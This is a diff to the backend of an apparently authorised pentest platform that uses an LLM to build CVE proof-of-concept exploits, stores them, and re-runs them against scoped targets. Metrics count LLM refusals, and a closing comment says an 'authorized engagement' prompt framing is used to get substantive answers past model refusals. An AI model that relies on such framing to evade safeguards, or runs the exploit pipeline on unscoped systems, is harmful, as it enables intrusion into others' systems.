+            d["success_rate"] = round(s / t, 3) if t > 0 else None
+            rows.append(d)
+        return {"pending": rows}
+
+
+@app.post("/refine-patterns/approve/{pattern_id}", tags=["RAG/Knowledge"])
+def approve_refine_pattern(pattern_id: str,
+                             body: RefinePatternApproveBody,
+                             authorized: bool = Depends(auth)):
+    """Promote a trace-mined learned pattern to live retrieval. Operator may
+    edit the guidance body before approving (recommended — the mined stub
+    says "operator must flesh out before approval"). Approval busts the
+    refine_patterns cache so the next build sees it."""
+    with get_db() as conn, conn.cursor() as cur:
+        cur.execute("SELECT 1 FROM public.refine_error_patterns "
+                    "WHERE id = %s AND source = 'learned'", (pattern_id,))
+        if not cur.fetchone():
+            raise HTTPException(404, "no pending learned pattern with that id")
+        if body.guidance:
+            cur.execute("""
+                UPDATE public.refine_error_patterns
+                   SET guidance = %s, approved_at = now(), approved_by = %s,
+                       updated_at = now()
+                 WHERE id = %s
+            """, (body.guidance, body.operator or "operator", pattern_id))
+        else:
+            cur.execute("""
+                UPDATE public.refine_error_patterns
+                   SET approved_at = now(), approved_by = %s, updated_at = now()
+                 WHERE id = %s
+            """, (body.operator or "operator", pattern_id))
+        conn.commit()
+    _REFINE_PATTERNS_CACHE["t"] = 0.0  # bust cache
+    try:
+        emit_webhook("refine_pattern_approved", "rag-knowledge",
+                     {"id": pattern_id, "operator": body.operator})
+    except Exception:  # noqa: BLE001
+        pass
+    return {"ok": True, "id": pattern_id}
+
+
+@app.delete("/refine-patterns/{pattern_id}", tags=["RAG/Knowledge"])
+def delete_refine_pattern(pattern_id: str, authorized: bool = Depends(auth)):
+    """Delete a learned pattern (never deletes YAML-loaded ones — those are
+    source='yaml' and only the loader can replace them). Rejects an
+    attempt to delete a yaml-source row with 403."""
+    with get_db() as conn, conn.cursor() as cur:
+        cur.execute("SELECT source FROM public.refine_error_patterns "
+                    "WHERE id = %s", (pattern_id,))
+        row = cur.fetchone()
+        if not row:
+            raise HTTPException(404, "pattern not found")
+        if row[0] == "yaml":
+            raise HTTPException(403, "cannot delete YAML-loaded patterns; "
+                                     "remove from knowledge/refine_error_patterns.yaml "
+                                     "and reload instead")
+        cur.execute("DELETE FROM public.refine_error_patterns WHERE id = %s",
+                    (pattern_id,))
+        conn.commit()
+    _REFINE_PATTERNS_CACHE["t"] = 0.0
+    return {"ok": True, "deleted": pattern_id}
+
+
+@app.post("/refine-patterns/mine", tags=["RAG/Knowledge"])
+def mine_refine_patterns(min_hits: int = 3,
+                           limit: int = 200,
+                           authorized: bool = Depends(auth)):
+    """Trigger the trace-mining pass that promotes recurring (error_signal,
+    successful_fix) pairs to pending learned patterns. Called by the cron
+    daemon; operators can also trigger ad-hoc from the UI."""
+    promoted = _mine_refine_pattern_candidates(limit=limit, min_hits=min_hits)
+    try:
+        emit_webhook("refine_patterns_mined", "rag-knowledge",
+                     {"promoted": len(promoted), "signals": [p["signal"] for p in promoted]})
+    except Exception:  # noqa: BLE001
+        pass
+    return {"ok": True, "promoted": promoted, "count": len(promoted)}
 
 
 @app.post("/software/poc-grants", tags=["Assets"])
@@ -14834,6 +19213,94 @@ def _save_exploit_store(name, cve=None, kind="cve_poc", target_host=None, target
                           "target": target_host, "engagement_id": eid})
         except Exception:  # noqa: BLE001
             pass
+        # (2) Dedicated webhook for the CVE PoC-builder path — carries the rich
+        # context an operator needs to decide whether to tweak-and-rerun or move
+        # on: iterations, verification method, confidence, canary, and the final
+        # command (truncated). Generic exploit_store_saved stays for other kinds.
+        if (kind == "cve_poc" or source == "cve_poc_builder") and cve:
+            try:
+                _md = metadata or {}
+                _m = (_md.get("metrics") or {}) if isinstance(_md, dict) else {}
+                emit_webhook("poc_build_completed", "cve_poc_builder", {
+                    "id": new_id, "cve": cve, "verified": bool(verified),
+                    "target": target_host, "port": target_port,
+                    "engagement_id": eid,
+                    "verification_method": _md.get("verification_method"),
+                    "verification_confidence": _md.get("verification_confidence"),
+                    "iterations": _m.get("iterations") or _m.get("target_runs"),
+                    "skipped_syntax": _m.get("skipped_runs_bad_syntax"),
+                    "skipped_refusal": _m.get("skipped_runs_llm_refusal"),
+                    "model": llm_model,
+                    "build_seconds": _m.get("build_seconds"),
+                    "needs_tweaking": not bool(verified),  # the trigger for review
+                    "command_preview": (command or "")[:280],
+                })
+            except Exception:  # noqa: BLE001
+                pass
+        # (3) Mirror the PoC build as a raw_artifacts row so it surfaces on the
+        # Scan Results page alongside tool scans. tool="cve_poc_builder" is a
+        # new category — distinguishable from nmap/nuclei/zap so operators can
+        # filter it. content is the human-readable build summary (verdict,
+        # metrics, final command, how to tweak) — not the raw trace, which stays
+        # at poc_log_path for deep forensics.
+        if (kind == "cve_poc" or source == "cve_poc_builder") and cve and command:
+            try:
+                _md = metadata or {}
+                _m = (_md.get("metrics") or {}) if isinstance(_md, dict) else {}
+                verdict = "VERIFIED" if verified else "FAILED — needs tweaking"
+                vmethod = _md.get("verification_method") or "n/a"
+                iters = _m.get("iterations") or _m.get("target_runs") or 0
+                skipped = ((_m.get("skipped_runs_bad_syntax") or 0)
+                           + (_m.get("skipped_runs_llm_refusal") or 0))
+                canary = (assertion or {}).get("canary") if isinstance(assertion, dict) else None
+                _artifact_content = (
+                    f"CVE PoC Build: {cve}\n"
+                    f"Target: {target_host}:{target_port}\n"
+                    f"Verdict: {verdict}\n"
+                    f"Verification method: {vmethod}\n"
+                    f"Iterations: {iters} (skipped-pre-dispatch: {skipped})\n"
+                    f"Canary: {canary or 'n/a'}\n"
+                    f"Model: {llm_model or 'n/a'}\n"
+                    f"Build seconds: {_m.get('build_seconds', 'n/a')}\n"
+                    f"Exploit Store id: {new_id}\n"
+                    f"PoC log: {poc_log_path or 'n/a'}\n"
+                    f"\n--- Final command ---\n{command}\n"
+                    f"\n--- Rationale ---\n{rationale or '(none)'}\n"
+                    f"\n--- Tweak-and-rerun ---\n"
+                    f"Open /exploits → Exploit Store → id {new_id} to edit the "
+                    f"command/assertion and re-run against the target."
+                )
+                _store_artifact_row(
+                    tool="cve_poc_builder",
+                    content=_artifact_content,
+                    command=(command or "")[:4000],
+                    target=target_host,
+                    port=target_port,
+                    service=product or "web",
+                    source="cve_poc_builder",
+                    engagement_id=eid,
+                    note=f"{cve} — {verdict}",
+                    content_format="text",
+                )
+            except Exception as e:  # noqa: BLE001
+                logging.debug("mirror cve_poc to raw_artifacts failed: %s", e)
+        # Live-embed technique into RAG. Verified rows go to verified_exploit_technique
+        # (positive signal); unverified go to failed_technique (negative signal — stops
+        # the strategist from re-exploring shapes we've seen fail).
+        try:
+            if verified:
+                _load_verified_technique_into_rag({
+                    "verified": True, "target_host": target_host, "cve": cve,
+                    "product": product, "version": version, "command": command,
+                    "engagement_id": eid}, engagement_id=eid)
+            else:
+                _load_failed_technique_into_rag({
+                    "verified": False, "target_host": target_host, "cve": cve,
+                    "product": product, "version": version, "command": command,
+                    "engagement_id": eid, "metadata": metadata or {}},
+                    engagement_id=eid)
+        except Exception:  # noqa: BLE001
+            pass
         return new_id
     except Exception as e:  # noqa: BLE001
         logging.warning("save exploit_store failed: %s", e)
@@ -14883,27 +19350,64 @@ class ExploitPushBody(BaseModel):
 @app.get("/exploit-store", tags=["Exploit Store"])
 def list_exploit_store(cve: Optional[str] = None, kind: Optional[str] = None,
                        verified: Optional[bool] = None, limit: int = 200,
+                       engagement_id: Optional[str] = None,
+                       all_engagements: bool = False,
+                       scope_only: bool = False,
                        authorized: bool = Depends(auth)):
-    """List saved exploits (Exploit Store). Filter by cve/kind/verified."""
+    """List saved exploits (Exploit Store). Filter by cve/kind/verified.
+
+    ENGAGEMENT FILTERING (enforced read-time, matches the project's engagement-
+    isolation rule in CLAUDE.md):
+      - Resolves the current engagement from X-Engagement-Id (what every page
+        in the dashboard already sends via apiFetch).
+      - Returns ONLY exploits where engagement_id matches, PLUS rows where
+        engagement_id IS NULL (legacy/global rows that pre-date the attribution
+        rule — shown in every engagement so they remain reachable).
+      - `?engagement_id=` overrides the header.
+      - `?all_engagements=true` disables engagement filtering (operator-explicit
+        global view). Primarily for cross-engagement audits.
+
+    SCOPE FILTERING:
+      - `?scope_only=true` additionally restricts to exploits whose target_host
+        matches a scope_targets row for the current engagement — i.e. only
+        exploits targeting hosts the operator is authorized to touch right
+        now. Keeps the Exploit Workbench honest about what's actionable."""
     _ensure_exploit_store()
     where, args = [], []
     if cve:
-        where.append("cve = %s"); args.append(cve.strip().upper())
+        where.append("es.cve = %s"); args.append(cve.strip().upper())
     if kind:
-        where.append("kind = %s"); args.append(kind)
+        where.append("es.kind = %s"); args.append(kind)
     if verified is not None:
-        where.append("verified = %s"); args.append(verified)
-    sql = ("SELECT id, name, cve, kind, target_host, target_port, product, version, "
-           "verified, source, security_test_id, llm_model, built_at, engagement_id, "
-           "created_by, created_at, updated_at, "
-           "(python_code IS NOT NULL) AS has_python, (http_request IS NOT NULL) AS has_http "
-           "FROM exploit_store")
+        where.append("es.verified = %s"); args.append(verified)
+    eid = _resolve_engagement_id(engagement_id)
+    if eid and not all_engagements:
+        where.append("(es.engagement_id = %s OR es.engagement_id IS NULL)")
+        args.append(eid)
+    if scope_only and eid:
+        # Join to scope_targets for the current engagement — keep only rows
+        # whose target_host matches an in-scope entry. Uses the host(ip) +
+        # text equality the dispatch gate itself uses.
+        where.append(
+            "EXISTS (SELECT 1 FROM scope_targets st "
+            "WHERE (st.engagement_id = %s OR st.engagement_id IS NULL) "
+            "AND es.target_host = st.target)"
+        )
+        args.append(eid)
+    sql = ("SELECT es.id, es.name, es.cve, es.kind, es.target_host, es.target_port, "
+           "es.product, es.version, es.verified, es.source, es.security_test_id, "
+           "es.llm_model, es.built_at, es.engagement_id, es.created_by, es.created_at, "
+           "es.updated_at, "
+           "(es.python_code IS NOT NULL) AS has_python, (es.http_request IS NOT NULL) AS has_http "
+           "FROM exploit_store es")
     if where:
         sql += " WHERE " + " AND ".join(where)
-    sql += " ORDER BY updated_at DESC LIMIT %s"; args.append(max(1, min(1000, limit)))
+    sql += " ORDER BY es.updated_at DESC LIMIT %s"; args.append(max(1, min(1000, limit)))
     with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
         cur.execute(sql, args)
-        return {"exploits": [dict(r) for r in cur.fetchall()]}
+        return {"exploits": [dict(r) for r in cur.fetchall()],
+                "engagement_id": eid, "all_engagements": bool(all_engagements),
+                "scope_only": bool(scope_only)}
 
 
 @app.get("/exploit-store/{exploit_id}", tags=["Exploit Store"])
@@ -15024,6 +19528,69 @@ def regenerate_exploit_artifacts(exploit_id: str, authorized: bool = Depends(aut
     return dict(out)
 
 
+@app.post("/exploit-store/{exploit_id}/run", tags=["Exploit Store"])
+def run_exploit(exploit_id: str, authorized: bool = Depends(auth)):
+    """Run the stored PoC's shell command through the listener and return the output.
+    Operator triggers this from the detail panel to confirm the exploit still works
+    (targets change, WAFs get tuned) without leaving the UI. Reuses the same
+    /vectors/run listener the build+refine loop already uses, so scope gate + timeout
+    + logging behave identically."""
+    import httpx as _hx
+    import time as _t
+    _ensure_exploit_store()
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("SELECT * FROM exploit_store WHERE id = %s", (exploit_id,))
+        row = cur.fetchone()
+    if not row:
+        raise HTTPException(404, "exploit not found")
+    if not row.get("command"):
+        return {"ok": False, "reason": "no command on this exploit"}
+    listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
+    vt = int(os.environ.get("VECTOR_RUN_TIMEOUT", "600"))
+    t0 = _t.time()
+    # response_time_ms captures the listener HTTP round-trip SEPARATELY from
+    # total wall-clock (seconds) — in bulk runs the operator wants to spot
+    # slow targets vs slow setup. httpx `elapsed` is None until the request
+    # completes, so we read it off `lr` after the call. target_response_ms
+    # is best-effort: when the command is a curl with `-w %{time_total}`,
+    # we parse that line out — otherwise falls back to the listener RTT.
+    response_time_ms = None
+    target_response_ms = None
+    try:
+        lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                       json={"command": row["command"], "target": str(row.get("target_host") or ""),
+                              "port": row.get("target_port") or 80, "timeout": vt},
+                       headers={"x-api-key": API_KEY}, verify=False, timeout=vt + 60)
+        try: response_time_ms = int(lr.elapsed.total_seconds() * 1000)
+        except Exception: pass  # noqa: BLE001
+        d = lr.json() if lr.status_code < 400 else {}
+        output = (d.get("output", "") if isinstance(d, dict) else "") or lr.text
+        exit_code = d.get("exit_code") if isinstance(d, dict) else None
+    except Exception as e:  # noqa: BLE001
+        output, exit_code = f"listener error: {e}", None
+    # Parse curl -w timing out of the output if the command emitted it
+    try:
+        target_response_ms = _parse_curl_time_total_ms(output)
+    except Exception:  # noqa: BLE001
+        pass
+    # Check the stored assertion against the fresh output to answer "does it STILL work?"
+    still_works = False
+    try:
+        still_works = _poc_assertion_passes(row.get("assertion") or {}, output, exit_code)
+    except Exception:  # noqa: BLE001
+        pass
+    return {
+        "ok": True, "exploit_id": exploit_id, "cve": row.get("cve"),
+        "target": f"{row.get('target_host')}:{row.get('target_port')}",
+        "command": row["command"], "output": output[:20000],
+        "exit_code": exit_code, "still_works": still_works,
+        "seconds": round(_t.time() - t0, 2),
+        "response_time_ms": response_time_ms,
+        "target_response_ms": target_response_ms,
+        "asserted_verified": bool(row.get("verified")),
+    }
+
+
 @app.get("/exploit-store/{exploit_id}/download", tags=["Exploit Store"])
 def download_exploit(exploit_id: str, fmt: str = "python", authorized: bool = Depends(auth)):
     """Download an artifact as a file: fmt=python | http | curl | json."""
@@ -15034,26 +19601,35 @@ def download_exploit(exploit_id: str, fmt: str = "python", authorized: bool = De
         row = cur.fetchone()
         if not row:
             raise HTTPException(404, "exploit not found")
-    safe = _re.sub(r"[^A-Za-z0-9_.-]+", "_", (row["cve"] or row["name"] or "exploit"))
+    # Filename shape (operator ask): "<cve>_<host>_<port>_<kind>.<ext>" when CVE known,
+    # else "<host>_<port>_<kind>.<ext>". Falls back to name/exploit if neither is set.
+    def _clean(s):
+        return _re.sub(r"[^A-Za-z0-9_.-]+", "_", str(s or "")).strip("_") or ""
+    parts = []
+    if row.get("cve"):     parts.append(_clean(row["cve"]))
+    if row.get("target_host"): parts.append(_clean(row["target_host"]))
+    if row.get("target_port"): parts.append(str(row["target_port"]))
+    if row.get("kind"):    parts.append(_clean(row["kind"]))
+    base = "_".join(p for p in parts if p) or _clean(row.get("name")) or "exploit"
     if fmt == "python":
         content = row["python_code"] or ""
         if not content and row["command"]:
             content = _exploit_store_artifacts(row["kind"], row["command"], row["name"],
                                                row["cve"], row["rationale"], row["assertion"])["python_code"] or ""
-        media, fn = "text/x-python", f"{safe}_poc.py"
+        media, fn = "text/x-python", f"{base}.py"
     elif fmt == "http":
         content = row["http_request"] or ""
         if not content and row["command"]:
             from common import exploit_artifacts as _ea
             content = _ea.curl_to_http_request(row["command"])
-        media, fn = "text/plain", f"{safe}_request.http"
+        media, fn = "text/plain", f"{base}.http"
     elif fmt == "curl":
-        content, media, fn = (row["command"] or ""), "text/plain", f"{safe}.sh"
+        content, media, fn = (row["command"] or ""), "text/plain", f"{base}.sh"
     elif fmt == "json":
         content = json.dumps({k: (str(v) if isinstance(v, (uuid.UUID,)) else v)
                               for k, v in dict(row).items()
                               if k not in ("engagement_id",)}, default=str, indent=2)
-        media, fn = "application/json", f"{safe}.json"
+        media, fn = "application/json", f"{base}.json"
     else:
         raise HTTPException(400, "fmt must be python|http|curl|json")
     return Response(content=content, media_type=media,
@@ -15262,6 +19838,73 @@ def get_exploit_version(exploit_id: str, version: int, authorized: bool = Depend
         return dict(r)
 
 
+@app.post("/exploit-store/{exploit_id}/versions/{version}/run", tags=["Exploit Store"])
+def run_exploit_version(exploit_id: str, version: int, authorized: bool = Depends(auth)):
+    """Run ONE specific version's command through the listener. Used by the bake-off
+    side-by-side view so the operator can select each LLM's variant and see how each
+    one actually behaves on the live target — 'which model's output really works?'
+    Mirrors /exploit-store/{id}/run but pulls command + assertion from the version
+    row instead of the exploit's current state. Target host/port come from the
+    parent exploit_store row so the version doesn't need to duplicate them."""
+    import httpx as _hx
+    import time as _t
+    _ensure_exploit_store()
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("SELECT target_host, target_port, cve FROM exploit_store WHERE id = %s",
+                    (exploit_id,))
+        parent = cur.fetchone()
+        if not parent:
+            raise HTTPException(404, "exploit not found")
+        cur.execute("SELECT command, assertion, llm_model, label FROM exploit_store_versions "
+                    "WHERE exploit_id = %s AND version = %s", (exploit_id, version))
+        v = cur.fetchone()
+        if not v:
+            raise HTTPException(404, "version not found")
+    if not v.get("command"):
+        return {"ok": False, "reason": "no command on this version"}
+    listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
+    vt = int(os.environ.get("VECTOR_RUN_TIMEOUT", "600"))
+    t0 = _t.time()
+    # Per-version runs are the bulk-scan surface (Run-all / Run-selected in
+    # the Versions chart) — operator wants per-row response-time so a slow
+    # model-generated command stands out. response_time_ms = listener RTT;
+    # target_response_ms = parsed from curl -w %{time_total} when present.
+    response_time_ms = None
+    target_response_ms = None
+    try:
+        lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                       json={"command": v["command"], "target": str(parent.get("target_host") or ""),
+                              "port": parent.get("target_port") or 80, "timeout": vt},
+                       headers={"x-api-key": API_KEY}, verify=False, timeout=vt + 60)
+        try: response_time_ms = int(lr.elapsed.total_seconds() * 1000)
+        except Exception: pass  # noqa: BLE001
+        d = lr.json() if lr.status_code < 400 else {}
+        output = (d.get("output", "") if isinstance(d, dict) else "") or lr.text
+        exit_code = d.get("exit_code") if isinstance(d, dict) else None
+    except Exception as e:  # noqa: BLE001
+        output, exit_code = f"listener error: {e}", None
+    try:
+        target_response_ms = _parse_curl_time_total_ms(output)
+    except Exception:  # noqa: BLE001
+        pass
+    still_works = False
+    try:
+        still_works = _poc_assertion_passes(v.get("assertion") or {}, output, exit_code)
+    except Exception:  # noqa: BLE001
+        pass
+    return {
+        "ok": True, "exploit_id": exploit_id, "version": version,
+        "label": v.get("label"), "llm_model": v.get("llm_model"),
+        "cve": parent.get("cve"),
+        "target": f"{parent.get('target_host')}:{parent.get('target_port')}",
+        "command": v["command"], "output": output[:20000],
+        "exit_code": exit_code, "still_works": still_works,
+        "seconds": round(_t.time() - t0, 2),
+        "response_time_ms": response_time_ms,
+        "target_response_ms": target_response_ms,
+    }
+
+
 @app.post("/exploit-store/{exploit_id}/versions", tags=["Exploit Store"])
 def save_exploit_version(exploit_id: str, body: SaveVersionBody, authorized: bool = Depends(auth)):
     """Snapshot the CURRENT state of an exploit as a new (optionally labeled) version —
@@ -15312,6 +19955,44 @@ def get_exploit_trace(exploit_id: str, authorized: bool = Depends(auth)):
         raise HTTPException(500, f"read trace: {e}")
 
 
+@app.get("/exploit-store/{exploit_id}/recon-comparison", tags=["Exploit Store"])
+def get_exploit_recon_comparison(exploit_id: str, authorized: bool = Depends(auth)):
+    """Per-tool recon comparison for this build: wall-clock and characters-added by each
+    tool that ran (port_sweep / basic / arjun / zap / zap_active), plus which recon_source
+    the operator picked. Read from metadata.metrics.recon_comparison set at build time.
+    Answers 'which recon tool was worth the time on this target?' — the benchmark data."""
+    _ensure_exploit_store()
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("SELECT cve, target_host, target_port, metadata FROM exploit_store WHERE id = %s",
+                    (exploit_id,))
+        row = cur.fetchone()
+    if not row:
+        raise HTTPException(404, "exploit not found")
+    md = row.get("metadata") or {}
+    metrics = md.get("metrics") or {}
+    rc = metrics.get("recon_comparison") or {}
+    if not rc:
+        return {"ok": True, "cve": row["cve"], "target": f"{row['target_host']}:{row['target_port']}",
+                "recon_comparison": {}, "reason": "no recon comparison stored (older build)"}
+    # Rank tools by chars_added / second (signal-per-second) so the winner is obvious.
+    ranked = []
+    for tool, m in rc.items():
+        secs = float(m.get("seconds") or 0)
+        chars = int(m.get("chars_added") or 0)
+        rate = round(chars / secs, 1) if secs > 0 else None
+        ranked.append({"tool": tool, "seconds": secs, "chars_added": chars,
+                       "signal": m.get("signal", ""), "chars_per_sec": rate})
+    ranked.sort(key=lambda x: (-(x["chars_per_sec"] or 0), x["seconds"]))
+    return {
+        "ok": True, "cve": row["cve"],
+        "target": f"{row['target_host']}:{row['target_port']}",
+        "recon_source": metrics.get("recon_source"),
+        "recon_seconds_total": metrics.get("recon_seconds_total"),
+        "ranked": ranked,
+        "recon_comparison": rc,
+    }
+
+
 @app.post("/exploit-store/{exploit_id}/restore/{version}", tags=["Exploit Store"])
 def restore_exploit_version(exploit_id: str, version: int, authorized: bool = Depends(auth)):
     """Restore a stored version into the main entry. The current state is snapshotted
@@ -15342,12 +20023,178 @@ def restore_exploit_version(exploit_id: str, version: int, authorized: bool = De
     return dict(row)
 
 
+def _fetch_advisory_text(url, timeout=6, max_bytes=40000):
+    """Fetch a URL body and reduce it to plain text (strip scripts/styles, collapse HTML
+    tags). Size-capped, timeout-capped, failure-quiet — this feeds LLM context, so a
+    dead or huge URL should never break the pipeline."""
+    import httpx as _hx, re as _re
+    try:
+        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout,
+                         headers={"User-Agent": "Mozilla/5.0 (compatible; PentestBot/1)"}) as cli:
+            r = cli.get(url)
+        if r.status_code >= 400:
+            return ""
+        ct = (r.headers.get("content-type") or "").lower()
+        body = r.text[:max_bytes]
+        if "html" in ct:
+            body = _re.sub(r"<script[^>]*>.*?</script>", "", body, flags=_re.S | _re.I)
+            body = _re.sub(r"<style[^>]*>.*?</style>", "", body, flags=_re.S | _re.I)
+            body = _re.sub(r"<[^>]+>", " ", body)
+            body = _re.sub(r"\s+", " ", body).strip()
+        return body[:max_bytes]
+    except Exception:  # noqa: BLE001
+        return ""
+
+
+def _fetch_cve_advisories_from_apis(cve, timeout=8):
+    """Pull CVE-specific advisory content from JSON APIs that don't need scraping.
+    GitHub Advisories API + CIRCL CVE Search return structured data — no client-side
+    JS shells, no rate-limit surprises like DDG. This is the primary path; DDG scrape
+    is the fallback when APIs miss.
+    Returns a compact text block with each source's advisory content."""
+    import httpx as _hx, json as _j
+    if not cve:
+        return ""
+    chunks = []
+    # 1. GitHub Advisories API — best source for vector-level detail
+    try:
+        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as cli:
+            r = cli.get(f"https://api.github.com/advisories?cve_id={cve}",
+                         headers={"Accept": "application/vnd.github+json"})
+        if r.status_code == 200:
+            for adv in (r.json() or [])[:2]:
+                bits = [f"GHSA: {adv.get('ghsa_id')}",
+                        f"Summary: {adv.get('summary', '')[:300]}",
+                        f"Severity: {adv.get('severity', '')}"]
+                if adv.get("description"):
+                    bits.append(f"Description: {adv['description'][:2500]}")
+                refs = adv.get("references") or []
+                if refs:
+                    bits.append("References: " + ", ".join(x.get("url", "") for x in refs[:6]))
+                chunks.append("--- GITHUB ADVISORY ---\n" + "\n".join(bits))
+                # Fetch each referenced repo/issue/PR (often the exact PoC)
+                for ref in refs[:3]:
+                    url = ref.get("url") or ""
+                    if any(h in url for h in ("github.com/", "gitee.com/")):
+                        body = _fetch_advisory_text(url, timeout=5, max_bytes=4000)
+                        if body:
+                            chunks.append(f"--- REF ({url}) ---\n{body[:3500]}")
+    except Exception:  # noqa: BLE001
+        pass
+    # 2. CIRCL CVE Search — mirrors NVD + references as JSON
+    try:
+        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as cli:
+            r = cli.get(f"https://cve.circl.lu/api/cve/{cve}")
+        if r.status_code == 200:
+            j = r.json() or {}
+            bits = []
+            if j.get("summary"): bits.append(f"Summary: {j['summary'][:2000]}")
+            if j.get("cvss"): bits.append(f"CVSS: {j['cvss']}")
+            if j.get("references"):
+                bits.append("References: " + ", ".join(j["references"][:8]))
+            if bits:
+                chunks.append("--- CIRCL/NVD ---\n" + "\n".join(bits))
+    except Exception:  # noqa: BLE001
+        pass
+    # 3. Nuclei templates — the goldmine when it exists. Direct raw content.
+    for nuclei_url in (
+        f"https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/main/http/cves/{cve[4:8]}/{cve}.yaml",
+        f"https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/http/cves/{cve[4:8]}/{cve}.yaml",
+    ):
+        try:
+            with _hx.Client(verify=False, follow_redirects=True, timeout=timeout) as cli:
+                r = cli.get(nuclei_url)
+            if r.status_code == 200 and len(r.text) > 100:
+                chunks.append(f"--- NUCLEI TEMPLATE ({nuclei_url}) ---\n{r.text[:4000]}")
+                break
+        except Exception:  # noqa: BLE001
+            continue
+    if not chunks:
+        return ""
+    return ("PUBLIC ADVISORIES for " + cve + " (from GitHub Advisories API + CIRCL + "
+            "Nuclei templates — these usually name the exact vulnerable endpoint/param):\n"
+            + "\n".join(chunks))
+
+
+def _research_cve_advisories(cve, max_results=3, per_url_bytes=6000):
+    """Advisory retrieval for a CVE. Fills the vector-level gap for novel CVEs where
+    MSF/ExploitDB have nothing. Order:
+      1. GitHub Advisories API + CIRCL + Nuclei template (structured JSON/YAML, no
+         rate-limit surprises).
+      2. DDG scrape (fallback when APIs miss).
+    Returns a compact text block; empty on total failure."""
+    if not cve:
+        return ""
+    # Try structured APIs first — always land, contain vector-level detail directly.
+    api_text = _fetch_cve_advisories_from_apis(cve)
+    if api_text:
+        return api_text
+    # Fire two queries and merge — DDG advanced operators (site:, quoted-strings, OR)
+    # often collapse the result set to zero on some result-page shapes. Plain queries
+    # get many more hits; we do the filtering client-side.
+    all_results = []
+    for query in (f"{cve} poc github", f"{cve} exploit advisory"):
+        try:
+            all_results.extend(ddg_search(query, max_results=10, timeout=8) or [])
+        except Exception:  # noqa: BLE001
+            pass
+    # Filter to real advisory-shaped URLs; skip DDG click-tracking, PDFs, ads.
+    seen_urls = set()
+    good = []
+    for r in all_results:
+        url = (r.get("url") or "").strip()
+        if not url or url in seen_urls:
+            continue
+        seen_urls.add(url)
+        if url.endswith(".pdf") or "duckduckgo.com/y.js" in url or "bing.com/aclick" in url:
+            continue
+        # Prioritize by likely value: nuclei templates (best — literal request template),
+        # GitHub advisories / repos / gists, Gitee, NVD, PoC aggregators, vendor changelogs.
+        weight = 0
+        if "nuclei-templates" in url or ".yaml" in url or ".yml" in url: weight += 5
+        if "github.com/advisories/" in url or "github.com/" in url and cve.lower() in url.lower(): weight += 4
+        if "github.com" in url or "gitee.com" in url: weight += 3
+        if "nvd.nist.gov" in url or "cve.mitre.org" in url: weight += 2
+        if "poc_detail" in url.lower() or "advisory" in url.lower() or "cvefeed" in url: weight += 2
+        if weight > 0:
+            r["_weight"] = weight
+            good.append(r)
+    good.sort(key=lambda x: -x.get("_weight", 0))
+    good = good[:max_results]
+    # Fallback: DDG occasionally returns empty (rate-limit, page-shape change). Hit a
+    # handful of well-known CVE aggregators directly so we always have SOMETHING.
+    if not good:
+        for direct_url, title in (
+            (f"https://nvd.nist.gov/vuln/detail/{cve}",
+             f"NVD detail for {cve}"),
+            (f"https://github.com/advisories?query={cve}",
+             f"GitHub Advisories search: {cve}"),
+            (f"https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve}",
+             f"MITRE CVE record: {cve}"),
+        ):
+            good.append({"url": direct_url, "title": title, "_weight": 1})
+        good = good[:max_results]
+    chunks = []
+    for r in good[:max_results]:
+        url = r["url"]
+        title = (r.get("title") or "")[:120]
+        body = _fetch_advisory_text(url, max_bytes=per_url_bytes)
+        if body:
+            chunks.append(f"--- ADVISORY: {title}\nURL: {url}\n{body[:per_url_bytes]}\n")
+    if not chunks:
+        return ""
+    return ("PUBLIC ADVISORIES for " + cve + " (fetched from DDG top hits — these often "
+            "name the exact vulnerable endpoint/param when MSF/ExploitDB have nothing):\n"
+            + "\n".join(chunks))
+
+
 def _research_exploit(cve, ip=None, port=None, product=None, version=None, eid=None, model=None):
     """Reference-PoC research: pull public exploit material for a CVE (Metasploit module,
-    ExploitDB PoC text, NVD refs) and have the LLM explain WHAT THE EXPLOIT CONSISTS OF —
-    preconditions, endpoint, method, params, payload, success signal — plus a seed command
-    to reproduce it on the target. This is the material that makes a synthesized PoC land
-    (vs a description-only guess). Returns {cve, analysis, sources, reference_poc, llm_model}."""
+    ExploitDB PoC text, NVD refs, GitHub/Gitee advisories via DDG) and have the LLM
+    explain WHAT THE EXPLOIT CONSISTS OF — preconditions, endpoint, method, params,
+    payload, success signal — plus a seed command to reproduce it on the target. This
+    is the material that makes a synthesized PoC land (vs a description-only guess).
+    Returns {cve, analysis, sources, reference_poc, llm_model}."""
     import requests as _rq
     cve = (cve or "").strip().upper()
     er = EXPLOIT_RUNNER_URL.rstrip("/")
@@ -15370,6 +20217,15 @@ def _research_exploit(cve, ip=None, port=None, product=None, version=None, eid=N
         if e.get("poc"):
             poc_text += f"\n--- EDB-{e.get('edb_id')}: {e.get('title', '')} ---\n{str(e['poc'])[:4000]}\n"
     msf_text = "\n".join(f"- MSF module {m.get('module')} (rank {m.get('rank')})" for m in msf)
+    # Advisory retrieval: for novel CVEs where MSF/ExploitDB have nothing, pull the
+    # top DDG-searched GitHub/Gitee/NVD advisory bodies. Often names the exact endpoint
+    # + param — the vector-level detail that unblocks description-only synth.
+    advisory_text = ""
+    if not msf and not poc_text:
+        try:
+            advisory_text = _research_cve_advisories(cve, max_results=3, per_url_bytes=6000)
+        except Exception:  # noqa: BLE001
+            advisory_text = ""
     tgt = f"http://{ip}:{port}" if ip else "the target"
     # Documentation posture: a defender/tester on an AUTHORIZED engagement writing up how the
     # vuln works and how to VALIDATE it. This framing gets a substantive answer where a
@@ -15382,6 +20238,7 @@ def _research_exploit(cve, ip=None, port=None, product=None, version=None, eid=N
               f"CVE description: {nvd.get('description') or '(none)'}\n"
               f"Metasploit module(s): {msf_text or '(none)'}\n"
